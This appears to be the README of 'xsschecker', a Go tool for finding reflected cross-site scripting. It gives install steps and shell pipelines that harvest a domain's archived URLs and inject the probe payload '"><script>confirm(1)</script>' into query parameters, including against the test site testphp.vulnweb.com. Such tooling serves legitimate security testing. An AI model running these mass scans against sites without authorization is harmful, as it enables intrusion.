```
██╗  ██╗███████╗███████╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
╚██╗██╔╝██╔════╝██╔════╝██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ╚███╔╝ ███████╗███████╗██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
 ██╔██╗ ╚════██║╚════██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██╔╝ ██╗███████║███████║╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
```

<h3 align="center">xsschecker tool checking reflected endpoints finding possible xss vulnerable endpoints.</h3>

## Install
```
go install github.com/rix4uni/xsschecker@latest
```
or

```
git clone https://github.com/rix4uni/xsschecker.git && cd xsschecker && go build xsschecker.go && mv xsschecker /usr/bin/
```
## Usage
```
go run xsschecker.go -h
Usage: xsschecker [OPTIONS]

Options:
  -match string
        The string to match against the domain response. (required)
  -vuln
        If set, only vulnerable URLs will be printed.
```

## Reflected XSS Mass Automation
```
cat subs.txt | waybackurls >> waybackurls-urls.txt
cat subs.txt | gau >> gau-urls.txt
cat waybackurls-urls.txt gau-urls.txt | anew -q urls.txt

cat urls.txt | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>'
```

## Reflected XSS Oneliner Command1
```
echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
```

## Reflected XSS Oneliner Command2
```
echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
```

## Reflected XSS Oneliner Command1 and Reflected XSS Oneliner Command2 Results Comparison
![image](https://github.com/rix4uni/xsschecker/assets/72344025/8034668c-42c3-47b1-9fee-5a58c2c96d63)

